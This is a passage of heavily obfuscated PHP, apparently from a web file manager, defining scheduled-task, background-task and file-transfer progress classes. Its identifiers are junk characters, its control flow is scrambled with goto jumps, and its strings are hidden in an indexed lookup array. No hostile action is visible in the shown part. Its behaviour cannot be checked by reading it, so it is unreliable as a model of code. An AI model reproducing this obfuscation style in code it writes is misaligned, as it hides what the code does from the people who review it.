$_SERVER[¦·]; http_close(); self::valueSet($BˆÔõ“ÌÆ[690], $BˆÔõ“ÌÆ[470]); sleep(self::valueGet($BˆÔõ“ÌÆ[1410]) + 5); self::valueSet($BˆÔõ“ÌÆ[1405], $BˆÔõ“ÌÆ[470]); self::valueSet($BˆÔõ“ÌÆ[690], $BˆÔõ“ÌÆ[83]); } public static function shutdownEvent() { $e©Ó“–ìÂ =& $_SERVER[¦·]; self::valueSet($e©Ó“–ìÂ[1405], $e©Ó“–ìÂ[470]); self::log($e©Ó“–ìÂ[1411]); } public static function config($f‚…£¯Ê½, $cŞÖ­İÒô¶) { $cë¿¶¾ÎÅ =& $_SERVER[¦·]; $D­îÂîÄ®ø = 20; $cŞÖ­İÒô¶ = intval($cŞÖ­İÒô¶) <= $D­îÂîÄ®ø ? $D­îÂîÄ®ø : intval($cŞÖ­İÒô¶); self::valueSet($cë¿¶¾ÎÅ[690], $f‚…£¯Ê½); self::valueSet($cë¿¶¾ÎÅ[1410], $cŞÖ­İÒô¶); } private static function taskRunAll() { $f™»ªØÂ =& $_SERVER[¦·]; $D…ó©Ñ”İò = Model($f™»ªØÂ[1412])->listData(); $D§„Ğó£æƒ = count($D…ó©Ñ”İò); for ($Aå•Ø®à = 0; $Aå•Ø®à < $D§„Ğó£æƒ; $Aå•Ø®à++) { $E ÊÁ™Ã¼ = $D…ó©Ñ”İò[$Aå•Ø®à]; if ($E ÊÁ™Ã¼[$f™»ªØÂ[1413]] != $f™»ªØÂ[83]) { continue; } if (!self::taskTimeCheck($E ÊÁ™Ã¼)) { continue; } self::taskRun($E ÊÁ™Ã¼); } Hook::trigger($f™»ªØÂ[1414]); } private static function taskTimeCheck($fÈî¬ç¸ˆ) { goto cµÜë§È­×; b†Ã„•ä­Š: switch ($B³÷ùÃ±ä‹[$Eé±ŠÂ™¬[29]]) { case $Eé±ŠÂ™¬[1421]: if (time() - $eË‰ öñå™ < 3600 * 24 * 30) { return !1; } if ($B³÷ùÃ±ä‹[$Eé±ŠÂ™¬[1421]] == date($Eé±ŠÂ™¬[1422]) && $BÁŒÄÚŸÜ÷) { return !0; } break; case $Eé±ŠÂ™¬[1423]: if (time() - $eË‰ öñå™ < 3600 * 24 * 7) { return !1; } $F âÈ‡ÍÕˆ = date($Eé±ŠÂ™¬[1424]) == 0 ? 7 : date($Eé±ŠÂ™¬[1424]); if ($B³÷ùÃ±ä‹[$Eé±ŠÂ™¬[1423]] == $F âÈ‡ÍÕˆ && $BÁŒÄÚŸÜ÷) { return !0; } break; case $Eé±ŠÂ™¬[1416]: if (time() - $eË‰ öñå™ < 3600 * 24) { return !1; } if ($BÁŒÄÚŸÜ÷) { return !0; } break; case $Eé±ŠÂ™¬[1425]: if (time() - $eË‰ öñå™ >= floatval($B³÷ùÃ±ä‹[$Eé±ŠÂ™¬[1425]]) * 60) { return !0; } break; default: break; } return !1; goto Dß°ÌßÜÄ; cµÜë§È­×: $Eé±ŠÂ™¬ =& $_SERVER[¦·]; $B³÷ùÃ±ä‹ = json_decode($fÈî¬ç¸ˆ[$Eé±ŠÂ™¬[190]], !0); $eË‰ öñå™ = intval($fÈî¬ç¸ˆ[$Eé±ŠÂ™¬[1406]]); goto dˆÙàÎ‹Øí; dˆÙàÎ‹Øí: $b£ö¬¸ª¬Á = strtotime($Eé±ŠÂ™¬[1415] . $B³÷ùÃ±ä‹[$Eé±ŠÂ™¬[1416]] . $Eé±ŠÂ™¬[1417]) - strtotime($Eé±ŠÂ™¬[1418]); $C¡ää ÷ê = time() - strtotime(date($Eé±ŠÂ™¬[1419]) . $Eé±ŠÂ™¬[1420]); $BÁŒÄÚŸÜ÷ = $C¡ää ÷ê >= $b£ö¬¸ª¬Á && $C¡ää ÷ê <= $b£ö¬¸ª¬Á + 3600; goto b†Ã„•ä­Š; Dß°ÌßÜÄ: } public static function taskRun($AÚó’ø™Ê) { goto fòƒª¼·äŠ; fòƒª¼·äŠ: $AØƒ§Éã² =& $_SERVER[¦·]; self::log($AØƒ§Éã²[1426] . $AÚó’ø™Ê[$AØƒ§Éã²[367]] . $AØƒ§Éã²[1427] . $AÚó’ø™Ê[$AØƒ§Éã²[28]] . $AØƒ§Éã²[1428] . $AÚó’ø™Ê[$AØƒ§Éã²[1429]]); Model($AØƒ§Éã²[1412])->run($AÚó’ø™Ê[$AØƒ§Éã²[367]]); goto aœçÕ†¥‹; aœçÕ†¥‹: $câ´©œÈÃ = timeFloat(); $f…‘ö’Ä…é = $AØƒ§Éã²[33]; switch ($AÚó’ø™Ê[$AØƒ§Éã²[29]]) { case $AØƒ§Éã²[295]: $EŒ‡°åñ– = url_request($AÚó’ø™Ê[$AØƒ§Éã²[1429]], $AØƒ§Éã²[216], !1, !1, !1, !1, 5); $f…‘ö’Ä…é = strlen($EŒ‡°åñ–); break; case $AØƒ§Éã²[215]: $f…‘ö’Ä…é = Hook::apply($AÚó’ø™Ê[$AØƒ§Éã²[1429]]); default: break; } goto b·¥êŒÍ‰¡; b·¥êŒÍ‰¡: Model($AØƒ§Éã²[1430])->add(array($AØƒ§Éã²[1431] => $AØƒ§Éã²[33], $AØƒ§Éã²[1432] => $AØƒ§Éã²[470], $AØƒ§Éã²[29] => $AØƒ§Éã²[1433] . $AÚó’ø™Ê[$AØƒ§Éã²[367]], $AØƒ§Éã²[1434] => json_encode(array($AØƒ§Éã²[28] => $AÚó’ø™Ê[$AØƒ§Éã²[28]], $AØƒ§Éã²[1435] => timeFloat() - $câ´©œÈÃ, $AØƒ§Éã²[281] => $f…‘ö’Ä…é)))); self::log($AØƒ§Éã²[1436] . $AÚó’ø™Ê[$AØƒ§Éã²[367]] . $AØƒ§Éã²[1437] . $f…‘ö’Ä…é); return !0; goto aŞ±Ô¬í; aŞ±Ô¬í: } private static function valueGet($Dµ…æ¤‰½‡) { $Däµ²àèšø =& $_SERVER[¦·]; $e™¯„‘† = $Däµ²àèšø[1438]; $bë––¹ö¦Ü = Model($Däµ²àèšø[1439])->get($Dµ…æ¤‰½‡, $e™¯„‘†); if (is_null($bë––¹ö¦Ü)) { Model($Däµ²àèšø[1439])->set($Däµ²àèšø[1410], 10, $e™¯„‘†); Model($Däµ²àèšø[1439])->set($Däµ²àèšø[690], $Däµ²àèšø[83], $e™¯„‘†); Model($Däµ²àèšø[1439])->set($Däµ²àèšø[1405], $Däµ²àèšø[470], $e™¯„‘†); $bë––¹ö¦Ü = Model($Däµ²àèšø[1439])->get($Dµ…æ¤‰½‡, $e™¯„‘†); } return $bë––¹ö¦Ü; } private static function valueSet($d¡é‘‰­ˆ, $D±©åÓãÚ) { $dØÖâ»†îì =& $_SERVER[¦·]; return Model($dØÖâ»†îì[1439])->set($d¡é‘‰­ˆ, $D±©åÓãÚ, $dØÖâ»†îì[1438]); } protected static function log($a‘ï±ª‘öğ) { write_log($a‘ï±ª‘öğ, $_SERVER[¦·][1440]); } private static function cacheClear() { $fîŞ¸ë…¤ˆ =& $_SERVER[¦·]; $D¢‚ÑÜ‡ = Model($fîŞ¸ë…¤ˆ[1439])->cacheKey($fîŞ¸ë…¤ˆ[1438]); Cache::clearMemory($D¢‚ÑÜ‡); Model($fîŞ¸ë…¤ˆ[1412])->cacheClear(); } } class Task { const STATYS_STOP = "\163\164\x6f\x70"; const STATYS_RUNNING = "\162\x75\x6e\x6e\x69\156\x67"; const STATYS_KILL = "\153\151\x6c\154"; public $task; public function __destruct() { $this->end(); } public function __construct($D¢”Êò—çÏ, $e±–Üö…¿ = '', $Aâº«âñì· = 0, $cš¤‘Óì‰ = '') { goto Bí÷…è‚Î; f´—­öÓƒ‚: Hook::bind($Aî›õ’¿‰Î[1407], array($this, $Aî›õ’¿‰Î[1449])); Hook::bind($Aî›õ’¿‰Î[1450], array($this, $Aî›õ’¿‰Î[1451])); $this->startAfter(); goto Fè‘·ÀÔŒ; Bí÷…è‚Î: $Aî›õ’¿‰Î =& $_SERVER[¦·]; if (self::get($D¢”Êò—çÏ)) { return; } $this->task = array($Aî›õ’¿‰Î[367] => $D¢”Êò—çÏ, $Aî›õ’¿‰Î[1441] => USER_ID, $Aî›õ’¿‰Î[1347] => $cš¤‘Óì‰, $Aî›õ’¿‰Î[29] => $e±–Üö…¿, $Aî›õ’¿‰Î[981] => $Aî›õ’¿‰Î[33], $Aî›õ’¿‰Î[979] => $Aâº«âñì·, $Aî›õ’¿‰Î[993] => 0, $Aî›õ’¿‰Î[1442] => 0, $Aî›õ’¿‰Î[1443] => 0, $Aî›õ’¿‰Î[1444] => timeFloat(), $Aî›õ’¿‰Î[1445] => 0, $Aî›õ’¿‰Î[1446] => 0, $Aî›õ’¿‰Î[1447] => 0, $Aî›õ’¿‰Î[1448] => 0, $Aî›õ’¿‰Î[690] => $Aî›õ’¿‰Î[1405]); goto f´—­öÓƒ‚; Fè‘·ÀÔŒ: Hook::trigger($Aî›õ’¿‰Î[1452], $this->task); $this->task[$Aî›õ’¿‰Î[1446]] = timeFloat(); goto aåáÑİØŸ¤; aåáÑİØŸ¤: } public function end() { goto BâŒÏ–Úˆ; BâŒÏ–Úˆ: $f£¼ê»æİ =& $_SERVER[¦·]; if (!$this->task) { return; } if ($this->task[$f£¼ê»æİ[1446]]) { self::valueSet($this->task[$f£¼ê»æİ[367]], !1); } goto FÉä¹¶î±Ñ; FÉä¹¶î±Ñ: $bÁåŸßîÁ´ = timeFloat() - $this->task[$f£¼ê»æİ[1444]]; self::log($f£¼ê»æİ[1453] . $this->task[$f£¼ê»æİ[367]] . $f£¼ê»æİ[1454] . $bÁåŸßîÁ´ . $f£¼ê»æİ[1455]); Hook::unbind($f£¼ê»æİ[1407], array($this, $f£¼ê»æİ[1449])); goto CÆŠ„†í«ò; CÆŠ„†í«ò: Hook::unbind($f£¼ê»æİ[1450], array($this, $f£¼ê»æİ[1451])); $this->endAfter(); $this->task = !1; goto A•÷ºŒŒŠ–; A•÷ºŒŒŠ–: } public function update($b‹˜Ø‰Œî = 0) { goto eÛïæ©À”; FÌ¾¸¡ÛÑà: $c¾Ñ»ÏØë¸[$aÍ·—µø¬ø[690]] = $f‡«Ç¥¬‘ì ? $f‡«Ç¥¬‘ì : $c¾Ñ»ÏØë¸[$aÍ·—µø¬ø[690]]; $c¾Ñ»ÏØë¸[$aÍ·—µø¬ø[1447]] = $e¤¾¹ĞŒí”[$aÍ·—µø¬ø[1447]] ? $e¤¾¹ĞŒí”[$aÍ·—µø¬ø[1447]] : 0; $c¾Ñ»ÏØë¸[$aÍ·—µø¬ø[1446]] = timeFloat(); goto Bñ¥Ù†Å; b¦Œ‹‚‘©é: $c¾Ñ»ÏØë¸[$aÍ·—µø¬ø[993]] += $b‹˜Ø‰Œî; $c¾Ñ»ÏØë¸[$aÍ·—µø¬ø[1445]] = timeFloat(); if ($c¾Ñ»ÏØë¸[$aÍ·—µø¬ø[979]]) { if ($c¾Ñ»ÏØë¸[$aÍ·—µø¬ø[979]] < $c¾Ñ»ÏØë¸[$aÍ·—µø¬ø[993]]) { $c¾Ñ»ÏØë¸[$aÍ·—µø¬ø[979]] = $c¾Ñ»ÏØë¸[$aÍ·—µø¬ø[993]]; } $EŞïŠŠÃŸ˜ = timeFloat() - $c¾Ñ»ÏØë¸[$aÍ·—µø¬ø[1444]] - $c¾Ñ»ÏØë¸[$aÍ·—µø¬ø[1447]]; $c¾Ñ»ÏØë¸[$aÍ·—µø¬ø[1442]] = $c¾Ñ»ÏØë¸[$aÍ·—µø¬ø[993]] / $c¾Ñ»ÏØë¸[$aÍ·—µø¬ø[979]]; $c¾Ñ»ÏØë¸[$aÍ·—µø¬ø[1443]] = $c¾Ñ»ÏØë¸[$aÍ·—µø¬ø[993]] / $EŞïŠŠÃŸ˜; if ($c¾Ñ»ÏØë¸[$aÍ·—µø¬ø[1442]] > 0) { $c¾Ñ»ÏØë¸[$aÍ·—µø¬ø[1448]] = $EŞïŠŠÃŸ˜ * (1 - $c¾Ñ»ÏØë¸[$aÍ·—µø¬ø[1442]]) / $c¾Ñ»ÏØë¸[$aÍ·—µø¬ø[1442]]; } $c¾Ñ»ÏØë¸[$aÍ·—µø¬ø[1448]] = $c¾Ñ»ÏØë¸[$aÍ·—µø¬ø[1448]] <= 0 ? 0 : $c¾Ñ»ÏØë¸[$aÍ·—µø¬ø[1448]]; } goto CŞ”£©¯Ô; E÷§†ÛéÜ: $e¤¾¹ĞŒí” = self::get($c¾Ñ»ÏØë¸[$aÍ·—µø¬ø[367]]); $f‡«Ç¥¬‘ì = $e¤¾¹ĞŒí”[$aÍ·—µø¬ø[690]]; if ($f‡«Ç¥¬‘ì == self::STATYS_KILL) { $eğÖÌÄº¹‚ = array($aÍ·—µø¬ø[1456] => LNG($aÍ·—µø¬ø[1457]), $aÍ·—µø¬ø[1035] => !1); Cache::set($aÍ·—µø¬ø[1458] . $this->task[$aÍ·—µø¬ø[367]], $eğÖÌÄº¹‚, 30); $this->end(); die; } else { if ($f‡«Ç¥¬‘ì == self::STATYS_STOP) { $B…¬òùù…ğ = 2; $e¤¾¹ĞŒí”[$aÍ·—µø¬ø[1447]] += $B…¬òùù…ğ; self::valueSet($c¾Ñ»ÏØë¸[$aÍ·—µø¬ø[367]], $e¤¾¹ĞŒí”); sleep($B…¬òùù…ğ); $this->update(); return; } } goto FÌ¾¸¡ÛÑà; Bñ¥Ù†Å: Hook::trigger($aÍ·—µø¬ø[1459], $c¾Ñ»ÏØë¸); self::valueSet($c¾Ñ»ÏØë¸[$aÍ·—µø¬ø[367]], $c¾Ñ»ÏØë¸); goto dØÒç¼º; CŞ”£©¯Ô: $this->updateAfter(); $bá‡éÄèğƒ = 0.2; if (timeFloat() - $c¾Ñ»ÏØë¸[$aÍ·—µø¬ø[1446]] < $bá‡éÄèğƒ) { return; } goto E÷§†ÛéÜ; eÛïæ©À”: $aÍ·—µø¬ø =& $_SERVER[¦·]; $c¾Ñ»ÏØë¸ =& $this->task; if (!$c¾Ñ»ÏØë¸) { return; } goto b¦Œ‹‚‘©é; dØÒç¼º: } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($cšÛ­¨Ñµ¡) { $E’‚â¼ˆË© =& $_SERVER[¦·]; Cache::set($E’‚â¼ˆË©[1458] . $this->task[$E’‚â¼ˆË©[367]], $cšÛ­¨Ñµ¡, 60); return $cšÛ­¨Ñµ¡; } public static function get($d¼ïªÙÛ°á) { return self::valueGet($d¼ïªÙÛ°á); } public static function listData() { $F™ÉºØàó = self::valueGet(); return array_sort_by($F™ÉºØàó, $_SERVER[¦·][1444], !0); } public static function kill($fíÕã‚ÌŸ) { return self::changeStatus($fíÕã‚ÌŸ, self::STATYS_KILL); } public static function stop($d½âùÀÊğĞ) { return self::changeStatus($d½âùÀÊğĞ, self::STATYS_STOP); } public static function restart($B„©‹Èê‰’) { return self::changeStatus($B„©‹Èê‰’, self::STATYS_RUNNING); } public static function killAll() { $Bï–£—³î™ =& $_SERVER[¦·]; $E¥•Ê‰§² = self::listData(); foreach ($E¥•Ê‰§² as $cæóÇ“ôÈ) { self::kill($cæóÇ“ôÈ[$Bï–£—³î™[367]]); } sleep(2); foreach ($E¥•Ê‰§² as $cæóÇ“ôÈ) { self::valueSet($cæóÇ“ôÈ[$Bï–£—³î™[367]], !1); } } private static function changeStatus($Fè»Ì”‚š¥, $fñâªš«´–) { goto c†êÄ¼°×ƒ; c†êÄ¼°×ƒ: $C„’æŠß±˜ =& $_SERVER[¦·]; $cî·‚‹Ò÷ = self::valueGet($Fè»Ì”‚š¥); if (!$cî·‚‹Ò÷) { return !1; } goto aÍ˜­›Êˆ¡; aÍ˜­›Êˆ¡: $cî·‚‹Ò÷[$C„’æŠß±˜[690]] = $fñâªš«´–; self::valueSet($Fè»Ì”‚š¥, $cî·‚‹Ò÷); self::log($C„’æŠß±˜[1460] . $cî·‚‹Ò÷[$C„’æŠß±˜[367]] . $C„’æŠß±˜[1461] . $fñâªš«´–); goto a’‰äİ‘·; a’‰äİ‘·: return !0; goto Aº¬Õƒ¬Æ”; Aº¬Õƒ¬Æ”: } public static function valueGet($c£¡øããØ = false) { $aÉ”¥ñëµ =& $_SERVER[¦·]; if ($c£¡øããØ) { $D…øŠ˜ëĞÏ = Model($aÉ”¥ñëµ[399])->where(array($aÉ”¥ñëµ[89] => $c£¡øããØ, $aÉ”¥ñëµ[29] => $aÉ”¥ñëµ[1462]))->find(); return $D…øŠ˜ëĞÏ ? json_decode($D…øŠ˜ëĞÏ[$aÉ”¥ñëµ[359]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($a’îÕš»Ï† = false) { goto dÓÆÈ¹ßµ; dÓÆÈ¹ßµ: $aƒ×ˆÈï‚ =& $_SERVER[¦·]; $Bôöêø—¦ = array($aƒ×ˆÈï‚[29] => $aƒ×ˆÈï‚[1462]); if ($a’îÕš»Ï†) { $Bôöêø—¦[$aƒ×ˆÈï‚[1441]] = $a’îÕš»Ï†; } goto D¡Ú§•°ô¢; cÀÑš©¡·Õ: return $bˆšÚ¯¼æ; goto b´İ„’È§Æ; D¡Ú§•°ô¢: $bˆšÚ¯¼æ = Model($aƒ×ˆÈï‚[399])->where($Bôöêø—¦)->select(); $bˆšÚ¯¼æ = $bˆšÚ¯¼æ ? $bˆšÚ¯¼æ : array(); foreach ($bˆšÚ¯¼æ as $FÖª‘¿–Ÿê => $bï–Ğ·Á‰Ê) { $bˆšÚ¯¼æ[$FÖª‘¿–Ÿê] = json_decode($bï–Ğ·Á‰Ê[$aƒ×ˆÈï‚[359]], !0); } goto cÀÑš©¡·Õ; b´İ„’È§Æ: } public static function valueSet($Fõƒ®œ¹À÷, $D¤êÑ¸‚Õ°) { goto dÃ—¡Ãë; dÃ—¡Ãë: $båØÏÓìèĞ =& $_SERVER[¦·]; if (!$D¤êÑ¸‚Õ°) { return Model($båØÏÓìèĞ[399])->where(array($båØÏÓìèĞ[89] => $Fõƒ®œ¹À÷, $båØÏÓìèĞ[29] => $båØÏÓìèĞ[1462]))->delete(); } $D„ÍÖĞ¬ïÚ = json_encode($D¤êÑ¸‚Õ°); goto F”ˆÇò“Î±; F”ˆÇò“Î±: if (!$D„ÍÖĞ¬ïÚ) { ob_start(); var_dump($D¤êÑ¸‚Õ°); $Fñ¡•½¾¨‰ = ob_get_clean(); self::log($båØÏÓìèĞ[1463] . json_encode_force($Fñ¡•½¾¨‰)); } if (!$Fõƒ®œ¹À÷ || !$D¤êÑ¸‚Õ°[$båØÏÓìèĞ[367]]) { return !1; } $E—©ˆˆ‡Û = array($båØÏÓìèĞ[29] => $båØÏÓìèĞ[1462], $båØÏÓìèĞ[1441] => USER_ID, $båØÏÓìèĞ[89] => $Fõƒ®œ¹À÷, $båØÏÓìèĞ[359] => $D„ÍÖĞ¬ïÚ); goto c‹÷Ş·Ğ; c‹÷Ş·Ğ: Model($båØÏÓìèĞ[399])->add($E—©ˆˆ‡Û, array(), !0); goto A¶Ñë“ƒä¡; A¶Ñë“ƒä¡: } public static function log($Då¿‹Âö²†) { write_log($Då¿‹Âö²†, $_SERVER[¦·][1464]); } } class TaskFileTransfer extends Task { protected function startAfter() { goto fÂá•£êò‹; fÂá•£êò‹: $fÄœ³Ú³ß =& $_SERVER[¦·]; $B†ÁØÃ¢œÊ =& $this->task; $this->sourceCopyFolder = !1; goto Eº»ĞÑ‰˜ˆ; A£ÇÜÑ™‚Ÿ: $B†ÁØÃ¢œÊ[$fÄœ³Ú³ß[981]] = $fÄœ³Ú³ß[33]; $B†ÁØÃ¢œÊ[$fÄœ³Ú³ß[1488]] = $fÄœ³Ú³ß[33]; $B†ÁØÃ¢œÊ[$fÄœ³Ú³ß[1489]] = 0; goto C’¨çÒˆí°; Eº»ĞÑ‰˜ˆ: Hook::bind($fÄœ³Ú³ß[1465], array($this, $fÄœ³Ú³ß[1466])); Hook::bind($fÄœ³Ú³ß[1467], array($this, $fÄœ³Ú³ß[1468])); Hook::bind($fÄœ³Ú³ß[1469], array($this, $fÄœ³Ú³ß[1470])); goto A•â¥Ùğóß; e„Æó·ë‘Ñ: Hook::bind($fÄœ³Ú³ß[1475], array($this, $fÄœ³Ú³ß[1476])); Hook::bind($fÄœ³Ú³ß[533], array($this, $fÄœ³Ú³ß[1477])); $this->sourceModelCopyFlag = !1; goto DƒÜé©³ÎÙ; E·‡çôà½–: $B†ÁØÃ¢œÊ[$fÄœ³Ú³ß[1484]] = LNG($fÄœ³Ú³ß[1485]); $B†ÁØÃ¢œÊ[$fÄœ³Ú³ß[1486]] = 0; $B†ÁØÃ¢œÊ[$fÄœ³Ú³ß[1487]] = 0; goto A£ÇÜÑ™‚Ÿ; DƒÜé©³ÎÙ: Hook::bind($fÄœ³Ú³ß[1478], array($this, $fÄœ³Ú³ß[1479])); Hook::bind($fÄœ³Ú³ß[1480], array($this, $fÄœ³Ú³ß[1481])); Hook::bind($fÄœ³Ú³ß[1482], array($this, $fÄœ³Ú³ß[1483])); goto E·‡çôà½–; A•â¥Ùğóß: Hook::bind($fÄœ³Ú³ß[540], array($this, $fÄœ³Ú³ß[1471])); Hook::bind($fÄœ³Ú³ß[541], array($this, $fÄœ³Ú³ß[1472])); Hook::bind($fÄœ³Ú³ß[543], array($this, $fÄœ³Ú³ß[1473])); goto B¸Á–§øïè; C’¨çÒˆí°: $B†ÁØÃ¢œÊ[$fÄœ³Ú³ß[1490]] = 0; $B†ÁØÃ¢œÊ[$fÄœ³Ú³ß[1491]] = 0; if (!$B†ÁØÃ¢œÊ[$fÄœ³Ú³ß[1347]]) { $B†ÁØÃ¢œÊ[$fÄœ³Ú³ß[1347]] = LNG($fÄœ³Ú³ß[1492]); } goto fé¶¢“‹”®; bêŞ—‘åæ¼: Hook::bind($fÄœ³Ú³ß[513], array($this, $fÄœ³Ú³ß[1474])); Hook::bind($fÄœ³Ú³ß[515], array($this, $fÄœ³Ú³ß[1474])); Hook::bind($fÄœ³Ú³ß[517], array($this, $fÄœ³Ú³ß[1474])); goto e„Æó·ë‘Ñ; B¸Á–§øïè: Hook::bind($fÄœ³Ú³ß[544], array($this, $fÄœ³Ú³ß[1473])); Hook::bind($fÄœ³Ú³ß[511], array($this, $fÄœ³Ú³ß[1474])); Hook::bind($fÄœ³Ú³ß[508], array($this, $fÄœ³Ú³ß[1474])); goto bêŞ—‘åæ¼; fé¶¢“‹”®: } protected function endAfter() { goto bíì—æâ¹µ; Cóœ©×—‚: Hook::unbind($bìç·›—’[1478], array($this, $bìç·›—’[1479])); Hook::unbind($bìç·›—’[1480], array($this, $bìç·›—’[1481])); Hook::unbind($bìç·›—’[1482], array($this, $bìç·›—’[1483])); goto a»éŞ¹À‹ò; AĞ´ù¬ æ¦: Hook::unbind($bìç·›—’[508], array($this, $bìç·›—’[1474])); Hook::unbind($bìç·›—’[513], array($this, $bìç·›—’[1474])); Hook::unbind($bìç·›—’[515], array($this, $bìç·›—’[1474])); goto aµ‚âÄÙ¡ö; DË¾‰§õ„: Hook::unbind($bìç·›—’[543], array($this, $bìç·›—’[1473])); Hook::unbind($bìç·›—’[544], array($this, $bìç·›—’[1473])); Hook::unbind($bìç·›—’[511], array($this, $bìç·›—’[1474])); goto AĞ´ù¬ æ¦; bíì—æâ¹µ: $bìç·›—’ =& $_SERVER[¦·]; Hook::unbind($bìç·›—’[1465], array($this, $bìç·›—’[1466])); Hook::unbind($bìç·›—’[1467], array($this, $bìç·›—’[1468])); goto CäÔ¯â°Ìò; aµ‚âÄÙ¡ö: Hook::unbind($bìç·›—’[517], array($this, $bìç·›—’[1474])); Hook::unbind($bìç·›—’[1475], array($this, $bìç·›—’[1476])); Hook::unbind($bìç·›—’[533], array($this, $bìç·›—’[1477])); goto Cóœ©×—‚; CäÔ¯â°Ìò: Hook::unbind($bìç·›—’[1469], array($this, $bìç·›—’[1470])); Hook::unbind($bìç·›—’[540], array($this, $bìç·›—’[1471])); Hook::unbind($bìç·›—’[541], array($this, $bìç·›—’[1472])); goto DË¾‰§õ„; a»éŞ¹À‹ò: } public function copyMoveStart($E·”î™ó­ , $FñŠß¼ˆÏ, $Cğ­ÛîË«ì, $CÉ‘š¯Ÿ›î) { goto b¦É‹¤¬Ÿ†; CæÎŠ÷õì‚: if (substr($FñŠß¼ˆÏ, 0, strlen($F”é¢Ÿ‰â)) == $F”é¢Ÿ‰â) { return; } if (substr($CÉ‘š¯Ÿ›î, 0, strlen($F”é¢Ÿ‰â)) == $F”é¢Ÿ‰â) { return; } $FƒÙ´“ÕÀ¶ =& $this->task; goto c»´é‡²²; b¦É‹¤¬Ÿ†: $bÕèÚ Âøª =& $_SERVER[¦·]; self::log($bÕèÚ Âøª[1493] . $FñŠß¼ˆÏ . $bÕèÚ Âøª[66] . $CÉ‘š¯Ÿ›î); $F”é¢Ÿ‰â = rtrim(TEMP_FILES, $bÕèÚ Âøª[8]); goto CæÎŠ÷õì‚; c»´é‡²²: $FƒÙ´“ÕÀ¶[$bÕèÚ Âøª[1494]] = KodIO::transferType($E·”î™ó­ , $Cğ­ÛîË«ì); $this->update(); goto B–æ’£³‰ˆ; B–æ’£³‰ˆ: } public function updateAfter() { goto Dá”öâ§Ø; aÈíó’‡è†: $F¹æäˆé’°[$C •½Å´ŞÙ[1442]] = $F¹æäˆé’°[$C •½Å´ŞÙ[1491]] / $F¹æäˆé’°[$C •½Å´ŞÙ[699]]; if ($F¹æäˆé’°[$C •½Å´ŞÙ[1442]] > 0) { $dĞÒëÉÓäÚ = timeFloat() - $F¹æäˆé’°[$C •½Å´ŞÙ[1444]] - $F¹æäˆé’°[$C •½Å´ŞÙ[1447]]; $F¹æäˆé’°[$C •½Å´ŞÙ[1448]] = $dĞÒëÉÓäÚ * (1 - $F¹æäˆé’°[$C •½Å´ŞÙ[1442]]) / $F¹æäˆé’°[$C •½Å´ŞÙ[1442]]; } goto BÌÊà£ÕéÃ; Dá”öâ§Ø: $C •½Å´ŞÙ =& $_SERVER[¦·]; $F¹æäˆé’° =& $this->task; if (!$F¹æäˆé’°[$C •½Å´ŞÙ[699]]) { return; } goto Fà¾ëõÎ˜Ş; Fà¾ëõÎ˜Ş: if ($this->sourceModelCopyFlag) { return; } if ($F¹æäˆé’°[$C •½Å´ŞÙ[1494]] == $C •½Å´ŞÙ[1097]) { return; } if ($F¹æäˆé’°[$C •½Å´ŞÙ[1494]] == $C •½Å´ŞÙ[1043] || $F¹æäˆé’°[$C •½Å´ŞÙ[1494]] == $C •½Å´ŞÙ[103]) { if ($F¹æäˆé’°[$C •½Å´ŞÙ[1488]]) { $F¹æäˆé’°[$C •½Å´ŞÙ[1491]] = $F¹æäˆé’°[$C •½Å´ŞÙ[1490]] + $F¹æäˆé’°[$C •½Å´ŞÙ[1487]]; } } else { if ($F¹æäˆé’°[$C •½Å´ŞÙ[1494]] == $C •½Å´ŞÙ[1098]) { if ($F¹æäˆé’°[$C •½Å´ŞÙ[1488]] == $C •½Å´ŞÙ[1043]) { $F¹æäˆé’°[$C •½Å´ŞÙ[1491]] = $F¹æäˆé’°[$C •½Å´ŞÙ[1490]] + $F¹æäˆé’°[$C •½Å´ŞÙ[1487]] * 0.5; } else { if ($F¹æäˆé’°[$C •½Å´ŞÙ[1488]] == $C •½Å´ŞÙ[103]) { $F¹æäˆé’°[$C •½Å´ŞÙ[1491]] = $F¹æäˆé’°[$C •½Å´ŞÙ[1490]] + $F¹æäˆé’°[$C •½Å´ŞÙ[1486]] * 0.5 + $F¹æäˆé’°[$C •½Å´ŞÙ[1487]] * 0.5; } } } } goto aÈíó’‡è†; BÌÊà£ÕéÃ: } public function addPath($dŞá…‰´¹ƒ) { goto CÇİÈª¬á¯; CÇİÈª¬á¯: $Bß®óæ½Í =& $_SERVER[¦·]; if (!$dŞá…‰´¹ƒ) { return; } $fß‰ˆ»Î« =& $this->task; goto Eˆ´°ºÅÖ‘; aô÷Ï¬çŒ: if ($aŠ…Å¶åËÆ[$Bß®óæ½Í[29]] == $Bß®óæ½Í[167]) { $fß‰ˆ»Î«[$Bß®óæ½Í[979]] += 1; } else { $fß‰ˆ»Î«[$Bß®óæ½Í[979]] += $aŠ…Å¶åËÆ[$Bß®óæ½Í[80]][$Bß®óæ½Í[78]]; if ($aŠ…Å¶åËÆ[$Bß®óæ½Í[369]]) { $fß‰ˆ»Î«[$Bß®óæ½Í[979]] += $aŠ…Å¶åËÆ[$Bß®óæ½Í[80]][$Bß®óæ½Í[79]] + 1; } } $fß‰ˆ»Î«[$Bß®óæ½Í[699]] += $aŠ…Å¶åËÆ[$Bß®óæ½Í[77]]; $this->update(); goto còÑÑ¨ßïæ; Eˆ´°ºÅÖ‘: $aŠ…Å¶åËÆ = IO::infoWithChildren($dŞá…‰´¹ƒ); $aˆêçİä™ = $fß‰ˆ»Î«[$Bß®óæ½Í[1495]] ? $fß‰ˆ»Î«[$Bß®óæ½Í[1495]][$Bß®óæ½Í[1496]] : 0; $fß‰ˆ»Î«[$Bß®óæ½Í[1495]] = array($Bß®óæ½Í[1496] => $aˆêçİä™ + 1, $Bß®óæ½Í[386] => $aŠ…Å¶åËÆ[$Bß®óæ½Í[28]], $Bß®óæ½Í[75] => $aŠ…Å¶åËÆ[$Bß®óæ½Í[75]], $Bß®óæ½Í[468] => $aŠ…Å¶åËÆ[$Bß®óæ½Í[468]] ? $aŠ…Å¶åËÆ[$Bß®óæ½Í[468]] : $aŠ…Å¶åËÆ[$Bß®óæ½Í[75]]); goto aô÷Ï¬çŒ; còÑÑ¨ßïæ: } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddFile($dƒƒÍ«âÙÒ) { $AÊœâ³Ôå² =& $_SERVER[¦·]; $eÁ‚°Íïµ =& 